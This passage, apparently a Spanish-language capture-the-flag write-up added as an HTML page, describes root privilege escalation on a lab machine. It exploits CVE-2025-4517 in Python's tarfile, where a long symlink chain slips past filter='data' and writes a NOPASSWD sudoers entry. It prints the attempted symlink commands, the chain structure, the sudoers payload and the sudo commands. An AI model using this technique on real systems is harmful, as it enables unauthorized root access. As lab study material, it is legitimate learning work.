+<span style="color:#abb2bf;">    client_id </span><span style="color:#56b6c2;">=</span><span style="color:#abb2bf;"> filename.split(</span><span style="color:#98c379;">'_'</span><span style="color:#abb2bf;">)[</span><span style="color:#d19a66;">1</span><span style="color:#abb2bf;">].rstrip(</span><span style="color:#98c379;">'.tar'</span><span style="color:#abb2bf;">)
+    </span><span style="color:#c678dd;">return</span><span style="color:#abb2bf;"> client_id.isdigit() </span><span style="color:#c678dd;">and</span><span style="color:#abb2bf;"> client_id </span><span style="color:#56b6c2;">!=</span><span style="color:#abb2bf;"> </span><span style="color:#98c379;">"0"</span>
+
+<span style="color:#c678dd;">def</span><span style="color:#abb2bf;"> </span><span style="color:#61afef;">validate_restore_tag</span><span style="color:#abb2bf;">(tag):
+    </span><span style="color:#c678dd;">return</span><span style="color:#abb2bf;"> </span><span style="color:#61afef;">bool</span><span style="color:#abb2bf;">(re.fullmatch(</span><span style="color:#98c379;">r"^[a-zA-Z0-9_]{1,24}$"</span><span style="color:#abb2bf;">, tag))
+
+</span><span style="color:#c678dd;">def</span><span style="color:#abb2bf;"> </span><span style="color:#61afef;">main</span><span style="color:#abb2bf;">():
+    </span><span style="color:#c678dd;">...</span>
+<span style="color:#abb2bf;">    staging_dir </span><span style="color:#56b6c2;">=</span><span style="color:#abb2bf;"> os.path.join(STAGING_BASE, args.restore_dir)
+    os.makedirs(staging_dir, exist_ok</span><span style="color:#56b6c2;">=</span><span style="color:#e5c07b;">True</span><span style="color:#abb2bf;">)
+    </span><span style="color:#c678dd;">try</span><span style="color:#abb2bf;">:
+        </span><span style="color:#c678dd;">with</span><span style="color:#abb2bf;"> tarfile.open(backup_path, </span><span style="color:#98c379;">"r"</span><span style="color:#abb2bf;">) </span><span style="color:#c678dd;">as</span><span style="color:#abb2bf;"> tar:
+            tar.extractall(path</span><span style="color:#56b6c2;">=</span><span style="color:#abb2bf;">staging_dir, filter</span><span style="color:#56b6c2;">=</span><span style="color:#98c379;">"data"</span><span style="color:#abb2bf;">)
+    </span><span style="color:#c678dd;">except</span><span style="color:#abb2bf;"> (tarfile.TarError, OSError, Exception) </span><span style="color:#c678dd;">as</span><span style="color:#abb2bf;"> e:
+        </span><span style="color:#61afef;">print</span><span style="color:#abb2bf;">(</span><span style="color:#98c379;">f"[!] Error during extraction: </span><span style="color:#56b6c2;">{e}</span><span style="color:#98c379;">"</span><span style="color:#abb2bf;">, file</span><span style="color:#56b6c2;">=</span><span style="color:#abb2bf;">sys.stderr)
+        sys.exit(</span><span style="color:#d19a66;">2</span><span style="color:#abb2bf;">)</span></code></pre>
+
+                <p>El script acepta un argumento <code>-b</code> (nombre del archivo de backup) y un <code>-r</code>
+                    (nombre del directorio de restauración), valida ambos con regex y llama a
+                    <code>tarfile.extractall(path=staging_dir, filter="data")</code>. La restricción clave es el acceso
+                    de escritura: no puedo escribir en <code>/opt/backup_clients/</code> en sí, pero <em>sí</em> tengo
+                    permisos de escritura en <code>/opt/backup_clients/backups/</code>, donde se leen los tarballs.</p>
+
+                <h3>Por qué los Ataques de Symlink los Bloquea <code>filter="data"</code></h3>
+                <p>La primera idea es crear un tarball con symlinks apuntando fuera del directorio de extracción.
+                    Por ejemplo:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">ln</span><span style="color:#abb2bf;"> -s ../../../../../../../etc/shadow shadow_relative
+</span><span style="color:#61afef;">ln</span><span style="color:#abb2bf;"> -s /etc/shadow shadow_absolute
+</span><span style="color:#61afef;">tar</span><span style="color:#abb2bf;"> -cf backup_1.tar shadow_relative
+</span><span style="color:#61afef;">tar</span><span style="color:#abb2bf;"> -cf backup_2.tar shadow_absolute</span></code></pre>
+
+                <pre><code class="language-plaintext"><span style="color:#e06c75;">[!] Error during extraction: 'shadow_relative' would link to '/etc/shadow', which is outside the destination
+[!] Error during extraction: 'shadow_absolute' is a link to an absolute path</span></code></pre>
+
+                <p>Ambos intentos son bloqueados. Es el comportamiento esperado de <code>filter="data"</code>,
+                    documentado en <a href="https://peps.python.org/pep-0706/#filters">PEP 706</a>:</p>
+
+                <blockquote>
+                    <p>"Refuse to extract links (hard or soft) that link to absolute paths. Refuse to extract links
+                        (hard or soft) which end up linking to a path outside of the destination."</p>
+                </blockquote>
+
+                <p>No hay otro vector de inyección obvio en el script, así que el enfoque pasa a buscar un CVE en la
+                    propia librería <code>tarfile</code>.</p>
+
+                <h3>Encontrando el CVE Adecuado</h3>
+                <p>Compruebo la versión de Python:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">python3</span><span style="color:#abb2bf;"> --version</span></code></pre>
+
+                <pre><code class="language-plaintext">Python 3.12.3</code></pre>
+
+                <p>Mi primer hallazgo es
+                    <a href="https://github.com/advisories/GHSA-2pg8-h2j6-28xm">CVE-2024-12718</a>, pero solo
+                    proporciona un primitivo útil cuando se usa <code>filter="tar"</code>. Con
+                    <code>filter="data"</code> el impacto se limita a cambios de metadatos, lo que no sirve aquí.</p>
+
+                <p>Siguiendo la búsqueda, encuentro una vulnerabilidad más reciente:
+                    <a href="https://github.com/advisories/GHSA-6r6c-684h-9j7p">CVE-2025-4517</a>, y un advisory de
+                    Google Security Research con una PoC funcional:
+                    <a href="https://github.com/google/security-research/security/advisories/GHSA-hgqp-3mmf-7h8f">GHSA-hgqp-3mmf-7h8f</a>.
+                    Éste permite <strong>escrituras arbitrarias de archivos</strong> incluso con
+                    <code>filter="data"</code>.</p>
+
+                <h3>Entendiendo CVE-2025-4517</h3>
+                <p>La vulnerabilidad reside en cómo <code>filter="data"</code> valida las cadenas de symlinks frente
+                    al <code>MAX_PATH</code> del kernel (4096 caracteres en Linux). El filtro llama a
+                    <code>os.path.realpath()</code> para resolver la cadena completa, pero <code>realpath()</code>
+                    trunca silenciosamente la resolución al alcanzar <code>MAX_PATH</code> — deja de seguir enlaces y
+                    devuelve un path incompleto e inexacto. El filtro entonces ve un path que parece estar dentro del
+                    directorio de staging y lo considera seguro.</p>
+
+                <p>El ataque funciona encadenando múltiples symlinks, cada uno con un path destino largo (~247
+                    caracteres), en unos 16 niveles que suman ~3952 caracteres. La estructura es la siguiente:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#61afef;">a</span><span style="color:#abb2bf;"> → ddddddd...ddd (247 chars)
+└─ </span><span style="color:#61afef;">b</span><span style="color:#abb2bf;"> → ddddddd...ddd (247 chars)
+   └─ </span><span style="color:#61afef;">c</span><span style="color:#abb2bf;"> → ddddddd...ddd (247 chars)
+      └─ </span><span style="color:#61afef;">...</span><span style="color:#abb2bf;"> (16 niveles, ~3952 chars en total)
+         └─ </span><span style="color:#e06c75;">final</span><span style="color:#abb2bf;"> → /etc/sudoers.d/wacky (archivo privilegiado destino)</span></code></pre>
+
+                <p>Cuando el filtro resuelve la cadena con <code>os.path.realpath()</code>, agota el
+                    <code>MAX_PATH</code> a mitad de la cadena y se detiene — sin llegar nunca al destino real. Lo
+                    considera válido y la extracción procede. En tiempo de ejecución, el kernel sigue la cadena de
+                    symlinks real y completa, y escribe en el archivo privilegiado.</p>
+
+                <h3>Construyendo y Ejecutando el Exploit</h3>
+                <p>Basándome en la PoC pública, creo un script Python (con ayuda de Claude) que genera un tarball
+                    malicioso. El último symlink de la cadena resuelve a <code>/etc/sudoers.d/wacky</code>, y el
+                    contenido del archivo es:</p>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">wacky ALL=(ALL) NOPASSWD: ALL</span></code></pre>
+
+                <p>Coloco el <code>backup_1.tar</code> resultante en <code>/opt/backup_clients/backups/</code> e
+                    invoco el script:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">sudo</span><span style="color:#abb2bf;"> /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py </span><span style="color:#e06c75;">-b</span><span style="color:#abb2bf;"> backup_1.tar </span><span style="color:#e06c75;">-r</span><span style="color:#abb2bf;"> restore_asd</span></code></pre>
+
+                <pre><code class="language-plaintext"><span style="color:#98c379;">[+]</span><span style="color:#abb2bf;"> Backup: backup_1.tar
+</span><span style="color:#98c379;">[+]</span><span style="color:#abb2bf;"> Staging directory: /opt/backup_clients/restored_backups/restore_asd
+</span><span style="color:#98c379;">[+]</span><span style="color:#abb2bf;"> Extraction completed in /opt/backup_clients/restored_backups/restore_asd</span></code></pre>
+
+                <p>Sin errores. Verifico el resultado:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">sudo</span><span style="color:#abb2bf;"> -l</span></code></pre>
+
+                <pre><code class="language-plaintext">User wacky may run the following commands on wingdata:
+    <span style="color:#abb2bf;">(root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *</span>
+    <span style="color:#98c379;">(ALL) NOPASSWD: ALL</span></code></pre>
+
+                <p>La entrada de sudoers se ha escrito correctamente. Con acceso <code>sudo</code> sin restricciones
+                    escalo a root y consigo la flag del sistema:</p>
+
+                <pre><code class="language-bash"><span style="color:#61afef;">sudo</span><span style="color:#abb2bf;"> su</span></code></pre>
+            </div>
+
+        </article>
+    </main>
+    <script src="../../index.js"></script>
+</body>
+
+</html>
